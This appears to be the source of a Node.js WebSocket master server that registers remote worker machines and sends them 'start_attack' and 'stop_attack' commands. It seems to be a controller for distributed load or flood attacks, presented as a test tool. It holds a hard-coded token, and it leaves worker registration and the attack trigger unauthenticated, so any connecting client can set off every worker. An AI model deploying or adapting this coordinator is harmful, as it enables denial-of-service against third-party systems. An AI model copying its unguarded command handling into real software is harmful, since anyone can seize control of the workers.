const WebSocket = require('ws');
const http = require('http');
const PORT = 8080;
const AUTH_TOKEN = 'wDr7aE2g7zYfdj9yEXxwkrf1e'; // 修改为你的安全密钥！

const workers = new Map();
const clients = new Map();

const server = http.createServer();
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
    const clientId = Math.random().toString(36).substring(7);
    const clientIP = req.socket.remoteAddress;
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            handleMessage(ws, data, clientId, clientIP);
        } catch (error) {
            // Heartbeat: 处理自定义 type: 'ping'
            if (message === 'ping' || (typeof message === 'object' && message.type === 'ping')) {
                ws.send(JSON.stringify({ type: 'pong' }));
                return;
            }
            ws.send(JSON.stringify({ type: 'error', message: 'invalid message format' }));
        }
    });
    ws.on('close', () => {
        workers.delete(clientId);
        clients.delete(clientId);
        broadcastWorkerList();
    });
    // 支持原生WebSocket ping/pong
    ws.on('ping', () => ws.pong());
});

function handleMessage(ws, data, clientId, clientIP) {
    switch (data.type) {
        case 'auth':
            if (data.token === AUTH_TOKEN) {
                clients.set(clientId, { ws, type: 'control', ip: clientIP });
                ws.send(JSON.stringify({ type: 'auth_success', message: 'Authed!' }));
            } else {
                ws.send(JSON.stringify({ type: 'auth_failed', message: 'Token invalid!' }));
                ws.close();
            }
            break;
        case 'register_worker':
            workers.set(clientId, { id: clientId, ip: clientIP, status: 'idle', ws: ws });
            ws.send(JSON.stringify({ type: 'worker_registered', workerId: clientId }));
            broadcastWorkerList();
            break;
        case 'get_workers':
            const workerList = Array.from(workers.values()).map(w => ({
                id: w.id, ip: w.ip, status: w.status
            }));
            ws.send(JSON.stringify({ type: 'workers_list', workers: workerList }));
            break;
        case 'start_test':
            workers.forEach(worker => {
                worker.status = 'running';
                worker.ws.send(JSON.stringify({ type: 'start_attack', config: data }));
            });
            broadcastWorkerList();
            break;
        case 'stop_test':
            workers.forEach(worker => {
                worker.status = 'idle';
                worker.ws.send(JSON.stringify({ type: 'stop_attack' }));
            });
            broadcastWorkerList();
            break;
        case 'stats_update':
            clients.forEach(client => {
                if (client.type === 'control')
                    client.ws.send(JSON.stringify({
                        type: 'stats_update', stats: data.stats, workerId: clientId
                    }));
            });
            break;
    }
}

function broadcastWorkerList() {
    const workerList = Array.from(workers.values()).map(w => ({
        id: w.id, ip: w.ip, status: w.status
    }));
    clients.forEach(client => {
        if (client.type === 'control') {
            client.ws.send(JSON.stringify({ type: 'workers_list', workers: workerList }));
        }
    });
}

server.listen(PORT, '0.0.0.0', () => {
    console.log('=================================');
    console.log('Master server started');
    console.log('WebSocket PORT:', PORT);
    console.log('Token:', AUTH_TOKEN);
    console.log('=================================');
});
